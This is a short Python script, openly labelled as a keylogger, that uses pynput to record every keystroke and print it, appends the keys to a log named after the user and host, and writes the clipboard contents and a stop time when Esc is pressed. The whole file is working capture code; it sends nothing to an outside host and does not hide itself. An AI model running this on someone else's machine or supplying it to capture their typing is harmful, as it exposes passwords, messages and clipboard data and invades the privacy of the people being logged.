#this script logs every keyboard input the user
#has entered. It also logs the clipboard when exiting. 
#Stops upon hitting Esc. 
#Saves output into <username>_<hostname>.log

import pyperclip
from pynput.keyboard import Key, Listener
from datetime import datetime
from socket import gethostname
from getpass import getuser

def on_press(key):
	print(str(key).strip("\'"))

	with open(f'{getuser()}_{gethostname()}.log','at') as f:

		#check type of input

		if key == Key.esc:
			f.write(f"\n\nStop time: {datetime.now()}\n")
			f.write(f"clipboard content: {pyperclip.paste()}\n\n")
			return False
		elif key == Key.space:
			f.write(" ")
		elif key == Key.tab:
			f.write('\t')
		elif key == Key.enter:
			f.write("\n")

		else:
			f.write(str(key).strip("\'"))
			
def key_logger():
	with open(f'{getuser()}_{gethostname()}.log','at') as f:
		f.write(f"Start time: {datetime.now()}\n\n")

	with Listener(on_press=on_press) as listener:
		listener.join()

if __name__=='__main__':
	key_logger()
